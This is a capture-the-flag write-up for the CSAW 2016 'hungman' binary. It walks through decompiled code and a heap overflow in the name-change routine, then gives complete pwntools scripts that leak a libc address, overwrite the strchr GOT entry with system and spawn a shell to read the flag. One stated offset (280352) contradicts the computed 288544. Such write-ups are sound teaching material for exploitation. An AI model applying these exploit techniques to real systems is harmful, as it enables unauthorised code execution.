
This writeup is based off of this writeup: `https://github.com/ret2libc/ctfs/tree/master/csaw2016/hungman`

First let's take a look at the binary:
```
$	file hungman 
hungman: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=dbb741004976269def7ff8e71dabd6f77287c955, stripped
$	checksec hungman 
[*] '/Hackery/ctf/csaw/pwn/hungman/hungman'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that it is a 64 bit elf, and that it has a stack canary and non-executable stack. Let's try running the elf.

```
./hungman 
What's your name?
guyinatuxedo
Welcome guyinatuxedo
____________
e
____________
i
____________
o
___o________
d
Default Highscore  score: 64
Continue? c
____________
e
e___________
i
ei__________
o
ei__________
o
ei__________
u
ei__u____uu_
r
Default Highscore  score: 64
Continue? q
____________
^C    

```

So we can see that like the name suggests it's a game of hangman (the words might not acutally be proper words). Let's take a look at the code in IDA. 

```
int __usercall highscore@<eax>(__int128 a1@<xmm0>, __int128 a2@<xmm1>, __int128 a3@<xmm2>, __int128 a4@<xmm3>)
{
  char char_util; // [sp+Bh] [bp-5h]@4
  int urandom; // [sp+Ch] [bp-4h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  memset(dest, 0, 0x200uLL);
  memcpy(dest, "Default Highscore ", 20uLL);
  high_score = 64;
  urandom = open("/dev/urandom", 0);
  if ( urandom == -1 )
    exit(1);
  pname = name();
  printf("Welcome %s\n", *(pname + 8));
  do
  {
    play(pname, urandom, a1, a2, a3, a4);
    printf("%s ", 6299904LL);
    printf("score: %d\n", high_score);
    printf("Continue? ");
    __isoc99_scanf(4198735LL, &char_util);
  }
  while ( char_util != 110 );
  return close(urandom);
}
```

We can see that it opens up urandom. After that we can see that it collects the user's name by running the `name` function which is covered next. After that we can see that it passes the player's name, and urandom to the `play` function which is covered later. After that it prints the user's score and prompts them to play again.

```
void *name()
{
  void *name; // ST10_8@3
  void *static_malloc; // ST18_8@3
  void *result; // rax@3
  __int64 v3; // rbx@3
  int initial_input; // [sp+Ch] [bp-124h]@1
  char *str_search; // [sp+10h] [bp-120h]@1
  char buf0; // [sp+20h] [bp-110h]@1
  __int64 int0; // [sp+118h] [bp-18h]@1

  int0 = *MK_FP(__FS__, 40LL);
  write(1, "What's your name?\n", 0x12uLL);
  memset(&buf0, 0, 0xF8uLL);
  initial_input = read(0, &buf0, 0xF7uLL);
  str_search = strchr(&buf0, 10);
  if ( str_search )
    *str_search = 0;
  name = malloc(initial_input);
  static_malloc = malloc(128uLL);
  memset(static_malloc, 0, 0x80uLL);
  *(static_malloc + 1) = name;
  *(static_malloc + 1) = initial_input;
  memcpy(*(static_malloc + 1), &buf0, initial_input);
  result = static_malloc;
  v3 = *MK_FP(__FS__, 40LL) ^ int0;
  return result;
}
```

So we can see that this segment essentially prompts for your name, stores it in `buf0`, then mallocs it and stores the pointer in `name`. It then copies over the contents of `buf0` to the malloced space pointed to by `static_malloc`, and returns it.

```
   input = *(player_struct + 4);
  malloc_players_name = malloc(input);
  if ( malloc_players_name )
  {                                             // Read from Urandom, generate a random character for each letter in the player's name
    read(urandom_arg, malloc_players_name, input);
    for ( i = 0LL; input - 1 > i; ++i )
    {
      *(malloc_players_name + i) ^= *(*(player_struct + 8) + i);
      *(malloc_players_name + i) = *(malloc_players_name + i) % 0x1Au + 97;
    }                                           // Establish 3 lives
    lives = 3;
    v5 = 0;
    double_check = 95;
    while ( lives > 0 )
    {                                           // Check if characters was already found, if not print `_`
      for ( j = 0LL; input - 1 > j; ++j )
      {
        if ( *(player_struct + *(malloc_players_name + j) - 97 + 16) )
          write(1, malloc_players_name + j, 1uLL);
        else
          write(1, "_", 1uLL);
      }
      write(1, "\n", 1uLL);
      __isoc99_scanf(4198735LL, &double_check);
      if ( double_check > 96 && double_check <= 122 )
      {
        if ( *(player_struct + double_check - 97 + 16) )
        {                                       // Check if input matches already found character, and if yes minus a life
          puts("nope");
          --lives;
        }
        else
        {
          v12 = v5;                             // The player correctly guess a character
          for ( length_for = 0LL; input - 1 > length_for; ++length_for )
          {
            if ( *(malloc_players_name + length_for) == double_check )
            {
              *(player_struct + double_check - 97 + 16) = 1;
              ++v5;
            }
          }
          if ( v12 == v5 )
            --lives;
          if ( input - 1 <= v5 )                // This runs when the player has won, score is calculate by length_of_name * 8
          {
            v6 = (input - 1) * 0.25 * 32.0 + *player_struct;
            *player_struct = floor(v6);
            goto change_name;
          }
        }
      }
      else
      {                                         // The player did something wrong and lost a life
        puts("nope");
        --lives;
      }
    }
    v6 = (input - 1) * 0.25 * v5 + *player_struct;
    *player_struct = floor(v6);
```

So we can see here that this is the code that actually plays hangman. It starts by reading data from urandom, so the characters in the words are random and won't  form an actual word. We can see that after it generates the letters, it recurisvely asks for letters untill the player either runs out of lives (there are 3), or they guess all of the letters. If the player wins and ends up with a higher score than the default (64) then they are prompted to change their name with `change_name`. Now in order to solve this challenge, we will need to be able to reliably win the game. Since the strings it generates aren't words, we can't play it like normal hangman. However since all of the characters it uses are characters, we could give it a name that is a 100 characters long, that way the string we have to guess is a 100 hacaracters long and should have atleast one instance pf each character. Then we should be able to just win the game by guessing each character in the alphabet.
```
change_name:
    if ( *player_struct > high_score )
    {
      puts("High score! change name?");
      __isoc99_scanf(4198735LL, &target_char);
      if ( target_char == 'y' )
      {
        new_name = malloc(248uLL);
        memset(new_name, 0, 248uLL);
        len_new_name = read(0, new_name, 248uLL);
        *(player_struct + 4) = len_new_name;
        v19 = strchr(new_name, 10);
        if ( v19 )
          *v19 = 0;
        memcpy(*(player_struct + 8), new_name, len_new_name);
        free(new_name);
      }
      snprintf(dest, 0x200uLL, "Highest player: %s", *(player_struct + 8), v6);
      high_score = *player_struct;
    }
    memset((player_struct + 16), 0, 0x1AuLL);
    free(malloc_players_name);
  }
}
```

So we can see here, this code changes the name by first reading it securely into malloced space pointed to by `new_name`. Then it uses the `memcpy` function to copy it over to the heap space allocated for the original name. This is the vulnerabillity in the code is the `memcpy` call because while scanning it in is secure, there isn't a check to ensure that the data it is copying over to `player_struct + 8` won't overflow it. So if we start the game with a name that is `x` characters long, then win the game and change our name to be `x + 1` characters along we will have a heap overflow.

Let's see what we can hit with this overflow:

```
gdb-peda$ b *0x400ED0
Breakpoint 1 at 0x400ed0
gdb-peda$ r
Starting program: /Hackery/ctf/csaw/pwn/hungman/hungman 
What's your name?
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
Welcome 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
____________________________________________________________________________________________________
qwertyuioplkjhgfdsazxcvbnm
______q____q_______________________q_________________________________q______________________________
__w___q__w_q_ww________w___________q_________________________________q______________________________
__w___q__w_q_wwe__e____w___________q___________e_____________________q_______________e______________
__w___q__w_q_wwe__e___rw___________q___________e___________r_________q_______________e______________
__w___q__w_q_wwet_e___rw___________q___________e___________r_________q_______________e_______t______
__w___q__w_q_wwet_e___rw_______y___q___________e___________r_________q___y______y____e_______t______
__w___q__w_q_wwet_e___rw_______y___q___________e___u_______r_________q___y______y____e_______t______
__w___q__w_q_wwet_e_i_rw_____i_y_i_q_______i___e___u_______r_________q___y______y___ie__i__i_t______
__w___q__w_q_wwet_e_i_rw_____ioy_i_q_______i___e___u______or_________q_o_y______y___ie_oi__i_t_____o
__wp__q__w_q_wwet_e_i_rw__pp_ioy_i_q____p__ip__e___up_____or_________q_o_y______yp__ie_oi__i_tp____o
__wp_lq__w_q_wwet_eli_rw__pp_ioy_i_q____p__ip__e___up_____or___l_____q_oly______yp__ie_oi__i_tp____o
__wp_lq__w_q_wwet_eli_rw__ppkioy_i_q____p_kip__e___up_____or__klk____q_oly______yp__ie_oi__i_tpk___o
__wp_lq__w_q_wwet_eli_rw__ppkioyji_q____p_kip__ej__up_____or__klk____q_oly_j____yp__ie_oi_ji_tpk___o
h_wp_lq__w_q_wwet_eli_rw__ppkioyji_q___hp_kip__ej__up_____or_hklk____q_oly_j____yp_hie_oi_ji_tpk__ho
h_wp_lq__w_q_wwet_eli_rw__ppkioyji_q__ghp_kip__ej__up_____orghklk____q_oly_j____yp_hie_oi_ji_tpkg_ho
h_wp_lq__w_q_wwet_eli_rw__ppkioyji_q__ghp_kip__ej_fup_____orghklk____q_oly_j____yp_hie_oifji_tpkg_ho
h_wp_lq__w_q_wwet_eli_rw__ppkioyji_qd_ghp_kip__ej_fup_____orghklk____q_oly_j____yp_hie_oifjidtpkg_ho
hswp_lq__w_q_wwet_eli_rw_sppkioyji_qd_ghp_kip__ej_fup_____orghklk___sq_oly_j_s__yp_hie_oifjidtpkg_ho
hswp_lq__waq_wwet_eli_rw_sppkioyji_qd_ghpakip__ej_fup_____orghklka__sq_oly_j_s__yp_hie_oifjidtpkg_ho
hswpzlq__waqzwwet_eli_rwzsppkioyjizqd_ghpakip__ej_fup_____orghklka__sq_oly_j_s__yp_hie_oifjidtpkg_ho
hswpzlq__waqzwwet_eli_rwzsppkioyjizqd_ghpakipx_ejxfup_____orghklka_xsq_oly_jxs__yp_hie_oifjidtpkg_ho
hswpzlq__waqzwwet_elicrwzsppkioyjizqdcghpakipx_ejxfup__c__orghklka_xsq_oly_jxs__ypchie_oifjidtpkg_ho
hswpzlq__waqzwwet_elicrwzsppkioyjizqdcghpakipx_ejxfup__c__orghklka_xsq_oly_jxs__ypchie_oifjidtpkg_ho
hswpzlq__waqzwwet_elicrwzsppkioyjizqdcghpakipxbejxfupbbcb_orghklkabxsq_oly_jxsb_ypchie_oifjidtpkgbho
hswpzlqn_waqzwwetnelicrwzsppkioyjizqdcghpakipxbejxfupbbcbnorghklkabxsq_oly_jxsbnypchie_oifjidtpkgbho
High score! change name?
y
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

and once we reach the breakpoint:
```
Breakpoint 1, 0x0000000000400ed0 in ?? ()
gdb-peda$ find 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Searching for '1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' in: None ranges
Found 2 results, display max 2 items:
[heap] : 0x603010 ('1' <repeats 100 times>)
[heap] : 0x603590 ('1' <repeats 100 times>)
gdb-peda$ x/32x 0x603010 
0x603010:	0x31313131	0x31313131	0x31313131	0x31313131
0x603020:	0x31313131	0x31313131	0x31313131	0x31313131
0x603030:	0x31313131	0x31313131	0x31313131	0x31313131
0x603040:	0x31313131	0x31313131	0x31313131	0x31313131
0x603050:	0x31313131	0x31313131	0x31313131	0x31313131
0x603060:	0x31313131	0x31313131	0x31313131	0x31313131
0x603070:	0x31313131	0x00000000	0x00000091	0x00000000
0x603080:	0x00000320	0x00000065	0x00603010	0x00000000
gdb-peda$ x/16g 0x603010 
0x603010:	0x3131313131313131	0x3131313131313131
0x603020:	0x3131313131313131	0x3131313131313131
0x603030:	0x3131313131313131	0x3131313131313131
0x603040:	0x3131313131313131	0x3131313131313131
0x603050:	0x3131313131313131	0x3131313131313131
0x603060:	0x3131313131313131	0x3131313131313131
0x603070:	0x0000000031313131	0x0000000000000091
0x603080:	0x0000006500000320	0x0000000000603010
gdb-peda$ x/g 0x603088
0x603088:	0x0000000000603010
```

So we can see our name is stored at 0x603010. We can also see that the pointer to it is stored at 0x603088, which we can overwrite with our overflow. So we know that with our overflow we can overwrite the pointer for the player's name. This is useful since if we overwrite the pointer with a different address, we can write to that address. Since we know that this elf doesn't have full RELRO, we can write to the GOT table, which will essentially allow us to rewrite the address of a function like `system` over one that is called like `strchr`. That way when `strchr` is called, it will really call system.  

As for the function we will want to overwrite, `strchr` seems like a good canidate. This is because we control the argument that is passed to it, so passing `/bin/sh` to it should be easy. In addition to that the only other time it's called is when the game starts so it shouldn't crash the binary. Now let's find the address of the strchr function in the got table.

```
$	readelf -a hungman | grep strchr
000000602038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 strchr@GLIBC_2.2.5 + 0
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.2.5 (2)
```

So we can see that the address of the `strchr` function in the got table is 0x602038. Now before we do the overflow, we see that there is some data between the senf of our input and the pointer we are overwriting:

```
gdb-peda$ x/4g 0x603070
0x603070:	0x0000000031313131	0x0000000000000091
0x603080:	0x0000006500000320	0x0000000000603010
```

Remeber that the pointer we are overwriting is at `player_struct + 8`. Also recall that there is the length is stored at `player_struct + 4`. which we can see is at 0x603080. If we overwrite this data with zeroes, the program will crash. So we should include the piece of data in our overflow to avoid the crash. Lastly the last piece we will need for this exploit is a leaked address so we can bypass ASLR. Fortunately for us, the program will try to print the player's name using the pointer we overwrote, so it will end up printing an address that we can use.

Here is the code to do so:
```
#import pwntools and start the ELF
from pwn import *
target = process("./hungman")

#Send the first name
name0 = "0"*100
target.sendline(name0)

#Win the game and change the name
print target.recvline()
target.sendline("qwertyuioplkjhgfdsazxcvbnm")
print target.recvuntil("High score! change name?")
target.sendline("y")

#Overwrite the pointer with the new name
name1 = "1"*112 + p64(0x0000006500000320) + p64(0x602038)
target.sendline(name1)

#Store the input of the elf trying to print the player's name and filter out the leaked address
leak = target.recvuntil("Continue?")
leak = leak.replace("Highest player: ", "")
leak = leak.replace(" score: 800", "")
leak = leak.replace("Continue?", "")
leak = leak.replace("\n", "")
leak = u64(leak + "\x00\x00")

#Print the leak
print "The leak is: " + hex(leak)

#Hand the process off to gdb, and start an interactive shell
gdb.attach(target)
target.interactive()
```

And when we go into gdb, we can see the offset between the leaked address and the address of `system`

First run the script:
```
$	python recon.py 
```

See the leaked address the script gives us:
```
High score! change name?
The leak is: 0x7f89e0403dc0
```

Look at gdb for the address of system
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7f89e03bd6a0 <__libc_system>
```

Calculate the difference:
```
>>> 0x7f89e03bd6a0 - 0x7f89e0403dc0
-288544
```

So we can see that if we subtract 280352 from the leaked address, we will have the address of system. Now that we have the address of system, we just need to win the game two more times. One to write over the `strchr` got entry with the address of `system`. The second to execute the overwritten `strchr` function with passing `/bin/sh` to it by setting our new name equal to that. I did not script out winning a second time, but instead choose to just do it manually since it's super easy (just type "jklm"). Here is the code to do that:

```
#import pwntools and start the ELF
from pwn import *
target = process("./hungman")

#Send the first name
name0 = "0"*100
target.sendline(name0)

#Win the game and change the name
print target.recvline()
target.sendline("qwertyuioplkjhgfdsazxcvbnm")
print target.recvuntil("High score! change name?")
target.sendline("y")

#Overwrite the pointer with the new name
name1 = "1"*112 + p64(0x0000006500000320) + p64(0x602038)
target.sendline(name1)

#Store the input of the elf trying to print the player's name and filter out the leaked address
leak = target.recvuntil("Continue?")
leak = leak.replace("Highest player: ", "")
leak = leak.replace(" score: 800", "")
leak = leak.replace("Continue?", "")
leak = leak.replace("\n", "")
leak = u64(leak + "\x00\x00")

#Calculate the address of system
sys_adr = leak - 288544

#Print the leak, and the system address
print "The leak is: " + hex(leak)
print "The address of system is: " + hex(sys_adr)

#Win the game again, and start the name change
target.sendline("y")
target.sendline("qwertyuioplkjhgfdsazxcvbnm")
target.sendline("y")
print target.recvline("High score! change name?")

#Change the name to rewrite the strchr got entry to system
target.send(p64(sys_adr))

#Hand the process off to the interactive shell
target.interactive()
``` 

Here is it in action:
```
$	python recon.py 
[+] Starting local process './hungman': pid 6652
What's your name?

Welcome 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
____________________________________________________________________________________________________
q_______q_q____________________q__________________________________________________q_________________
q_______q_q______w_____________q__________________________________________________q____w_w__________
q_______q_q______w_____________q________________e_________________________________q____w_w__________
q_______q_q______w____________rq_______r____r___e_________________________________q____w_w__________
q_______q_q______w_________t__rq___t___r____r___e_t_t______t______________________q___tw_w__________
q_______q_q______w_________t__rq___t___r____r___e_t_t_y____t______________________q___tw_w__y_______
q_______q_q___u__w______u__t__rq___tu__r_u__r___eut_t_y____t_____________________uq___tw_w__y_______
q_______q_q___u__w______u__t__rq___tu__r_u__r___eut_t_y____t_____________________uq___tw_w_iy_______
q_______q_q__ou__w____o_u__t__rq___tu__r_u__r___eut_t_y____t___________o_________uq___tw_w_iy_______
q_____ppq_qp_ou__w_p__o_u__t__rq___tu__r_u__r___eut_t_y____t___________o______p__uq___tw_w_iy_______
q_____ppq_qp_ou__wlp__o_u__t__rq___tu__r_u__r___eutlt_yl___t_l_________o______p__uqll_tw_w_iy_l_____
q_____ppq_qpkou__wlp_ko_u__t__rq___tu__r_uk_r___eutlt_yl___t_l_________o______p__uqll_tw_w_iy_l____k
q_____ppq_qpkou__wlp_ko_u__t__rqj__tu__r_uk_r___eutlt_yl___t_l_________o______p__uqll_tw_w_iy_l____k
q_____ppqhqpkou__wlp_ko_u__t__rqj__tu__r_uk_r___eutlthyl___t_l_________o______p_huqll_tw_w_iy_l____k
q____gppqhqpkou__wlp_ko_u__t__rqj__tu__r_uk_r_g_eutlthyl___t_l______g__og__g__pghuqll_tw_wgiy_l____k
q____gppqhqpkou__wlp_ko_u__t_frqj__tuf_r_uk_r_g_eutlthyl___t_l_f_f__g__og__g__pghuqll_tw_wgiy_l____k
q____gppqhqpkou__wlp_kodu__t_frqj__tufdr_ukdr_g_eutlthyl___t_ldf_f__g__og__g__pghuqlldtw_wgiy_l____k
q_s__gppqhqpkou__wlp_kodu__tsfrqj_stufdr_ukdr_g_eutlthyl_s_t_ldfsf__g__og__g_spghuqlldtw_wgiy_ls___k
q_s__gppqhqpkou_awlpakodu__tsfrqj_stufdr_ukdrag_eutlthylas_t_ldfsf__g__og__g_spghuqlldtw_wgiy_ls_a_k
q_s__gppqhqpkouzawlpakodu__tsfrqj_stufdr_ukdrag_eutlthylasztzldfsf__g__og__g_spghuqlldtw_wgiy_lsza_k
qxsx_gppqhqpkouzawlpakodu_xtsfrqj_stufdr_ukdrag_eutlthylasztzldfsf__g__og__g_spghuqlldtw_wgiy_lsza_k
qxsx_gppqhqpkouzawlpakodu_xtsfrqjcstufdr_ukdrag_eutlthylasztzldfsf__gc_og_cgcspghuqlldtw_wgiyclsza_k
qxsxvgppqhqpkouzawlpakodu_xtsfrqjcstufdr_ukdragveutlthylasztzldfsf__gc_og_cgcspghuqlldtwvwgiyclsza_k
qxsxvgppqhqpkouzawlpakodubxtsfrqjcstufdrbukdragveutlthylasztzldfsf__gc_ogbcgcspghuqlldtwvwgiyclsza_k
qxsxvgppqhqpkouzawlpakodubxtsfrqjcstufdrbukdragveutlthylasztzldfsfnngc_ogbcgcspghuqlldtwvwgiyclsza_k
High score! change name?
The leak is: 0x7ffff7a96ab0
The address of system is: 0x7ffff7a52390
 ____________________________________________________________________________________________________

[*] Switching to interactive mode
_______________________________________________q____________q_______________________q____q__________
________________________w________________w_____q____________q_______________________q____q____w_____
__e_____e_________e_____w________________w___e_q___e________q_________e_____________q____q____w_____
__e_____e_________e__r__w___________r____w___e_q___e___r____q_r_r_____e_____________q____q____w_____
__e___t_e_________e__r__w___________r____w___e_q___e___r_t__q_r_r_____e____t________q____q____w_____
__e___t_e_________e__r__w_____y___y_r____w_y_e_q___e___r_t__q_r_r_____e____t________q____q__y_w_y___
__e___t_e_________e__r__w_____y___y_r____w_y_e_q___e___r_t__q_r_r_____e_u__t________q____q__yuw_y___
_ie__it_e_________e__r__w_____y___y_r____w_y_e_q___e___r_ti_q_r_r_____e_u__t___i____q____q__yuw_y___
_ie__it_e_________e__r__w_____y___y_r____w_y_e_q___e___r_ti_q_r_r_____e_uoot___i____q____q__yuw_yo__
_ie__it_e__p______e__r__w_____y___y_r__p_w_y_e_q___e___rpti_q_r_r_____e_uoot___i____qp___q__yuw_yo_p
_ie_lit_e__p____l_e__r_lw_____y___y_r__p_w_y_e_q___e___rpti_q_r_r_____e_uoot___i_l__qp___q__yuw_yolp
_ie_litke_kpk___l_e__r_lw_____y___y_r__p_w_y_e_q___e_k_rpti_q_r_r___k_e_uoot___i_l__qp___qk_yuw_yolp
_ie_litke_kpkj__l_e__r_lw_____y___y_r__p_w_y_e_q___e_k_rpti_q_r_r___kje_uoot___i_l__qp___qk_yuw_yolp
_ie_litke_kpkj__l_e__r_lw_h___y___y_r__p_w_y_ehq_h_e_k_rpti_q_r_r___kje_uoot___i_l__qp___qk_yuw_yolp
_ie_litke_kpkj__l_e__r_lw_h___y__gy_r__p_w_y_ehq_h_e_k_rpti_q_r_r___kjeguootg__i_l__qp___qk_yuw_yolp
_ie_litke_kpkj__l_e__r_lwfh_f_y__gy_rf_p_w_y_ehq_h_e_k_rpti_q_r_r___kjeguootg__i_lf_qp___qk_yuwfyolp
_ie_litke_kpkj__l_e__r_lwfh_f_y_dgy_rf_p_w_y_ehq_hdedk_rpti_q_r_r___kjeguootg__i_lf_qp___qk_yuwfyolp
_ie_litke_kpkjs_lse__r_lwfh_f_y_dgy_rf_p_w_y_ehq_hdedk_rptisq_r_r___kjeguootg__i_lf_qp___qk_yuwfyolp
_ie_litke_kpkjsalse__r_lwfh_f_y_dgy_rfap_w_y_ehq_hdedk_rptisq_r_r___kjeguootga_ialf_qp___qk_yuwfyolp
_ie_litke_kpkjsalse__rzlwfhzf_y_dgy_rfap_wzy_ehq_hdedkzrptisq_r_r___kjeguootga_ialf_qp___qkzyuwfyolp
_ie_litkexkpkjsalse_xrzlwfhzfxy_dgy_rfap_wzy_ehq_hdedkzrptisq_rxr___kjeguootga_ialfxqpx__qkzyuwfyolp
_ie_litkexkpkjsalse_xrzlwfhzfxy_dgy_rfapcwzy_ehq_hdedkzrptisqcrxrcc_kjeguootga_ialfxqpx__qkzyuwfyolp
_ievlitkexkpkjsalse_xrzlwfhzfxy_dgy_rfapcwzy_ehq_hdedkzrptisqcrxrcc_kjeguootga_ialfxqpx_vqkzyuwfyolp
_ievlitkexkpkjsalse_xrzlwfhzfxybdgybrfapcwzybehq_hdedkzrptisqcrxrcc_kjeguootga_ialfxqpx_vqkzyuwfyolp
nievlitkexkpkjsalsenxrzlwfhzfxybdgybrfapcwzybehqnhdedkzrptisqcrxrccnkjeguootga_ialfxqpx_vqkzyuwfyolp
High score! change name?
Highest player: \x90#\xa5�� score: 1600
Continue? $ y
_______
$ j
_______
$ k
_______
$ l
Highest player: \x90#\xa5�� score: 1600
Continue? $ y
_______
$ j
____j__
$ k
____j_k
$ l
_l__j_k
$ m
_l__j_k
$ n
_l__j_k
$ o
_lo_j_k
$ p
High score! change name?
$ y
$ /bin/sh
$ ls
core        flag.txt  peda-session-hungman.txt    Readme.md  working.py
exploit.py  hungman   peda-session-ls.txt    recon.py
$ cat flag.txt
flag{this_looks_like_its_a_well_hungman}
```

Just like that, we pwned the elf.




